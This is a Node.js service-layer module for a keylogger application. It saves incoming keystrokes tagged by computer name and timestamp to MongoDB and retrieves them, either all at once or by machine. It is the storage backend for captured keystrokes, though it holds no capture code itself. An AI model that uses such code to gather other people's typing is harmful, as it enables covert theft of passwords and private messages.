/**
 * Author: Keven McDowell
 * Description: Acts as the service layer, which in the Model View Controller
 * idea of laying things out, is mean't to handle all business logic
 * happening on the server. Anything that needs to go to the database from
 * the controller goes through here first.
 */

// Importing our Repository layer.
const keyloggerRepo = require("../repository/keyloggerRepo");

// Service module.
const keyloggerService = {
  /**
   * @function connectDB
   * Function for calling the repository layer to make connection to the mongoDB instance.
   */
  connectDB: () => {
    return keyloggerRepo.connectDB();
  },
  
  /**
   * @function saveKeystrokes
   * @param {postReq}
   * -Contains the json grabbed by the post request made from the server that is going to 
   *  be saved in the database
   *  Function for saving keystrokes to the database.
   */
  saveKeystrokes: postReq => {
    console.log("POST REQUEST: ", postReq);
    return keyloggerRepo.saveStrokes( // Returning the result that comes back form the database.
      postReq.computerName,
      postReq.keystrokes,
      postReq.timestamp
    );
  },
  /**
   * @function getAllStrokes
   * Function for grabbing all of our keystrokes from the database in the repository layer.
   */
  getAllStrokes: () => {
    return keyloggerRepo.retrieveKeyStrokes(); // Returning the result from the database.
  },
  /**
   * @function getKeyStrokesByName
   * @param {compName}
   * Function for querying keystrokes by computer name.
   */
  getKeyStrokesByName: compName => {
    return keyloggerRepo.searchKeyStrokesByName(compName); // Returning the result from the database.
  }
};

module.exports = keyloggerService;
